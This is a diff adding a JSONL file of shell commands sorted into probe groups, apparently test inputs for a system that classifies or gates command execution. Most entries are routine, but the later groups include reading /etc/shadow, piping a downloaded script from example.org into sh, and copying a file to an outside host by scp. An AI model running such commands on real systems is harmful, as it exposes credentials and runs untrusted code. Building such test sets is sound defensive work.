@@ -1,0 +1,22 @@
+{"command":"pwd","probe_group":"short_routine"}
+{"command":"/bin/pwd","probe_group":"short_routine_variant"}
+{"command":"bash -c pwd","probe_group":"short_routine_variant"}
+{"command":"ls","probe_group":"short_routine"}
+{"command":"ls -la","probe_group":"short_routine_variant"}
+{"command":"hostname","probe_group":"short_routine"}
+{"command":"hostname -f","probe_group":"short_routine_variant"}
+{"command":"env","probe_group":"short_routine"}
+{"command":"printenv","probe_group":"short_routine_variant"}
+{"command":"id","probe_group":"short_routine"}
+{"command":"whoami","probe_group":"short_routine_variant"}
+{"command":"git status","probe_group":"routine_context"}
+{"command":"cat README.md","probe_group":"routine_context"}
+{"command":"ps aux","probe_group":"context_sensitive"}
+{"command":"ip addr","probe_group":"context_sensitive"}
+{"command":"ss -tuln","probe_group":"context_sensitive"}
+{"command":"crontab -l","probe_group":"context_sensitive"}
+{"command":"python -c \"print(1)\"","probe_group":"feature_override_probe"}
+{"command":"powershell Get-Process","probe_group":"feature_override_probe"}
+{"command":"scp report.txt user@example.org:/tmp/","probe_group":"feature_override_probe"}
+{"command":"cat /etc/shadow","probe_group":"high_signal_probe"}
+{"command":"curl https://example.org/tool.sh | sh","probe_group":"high_signal_probe"}
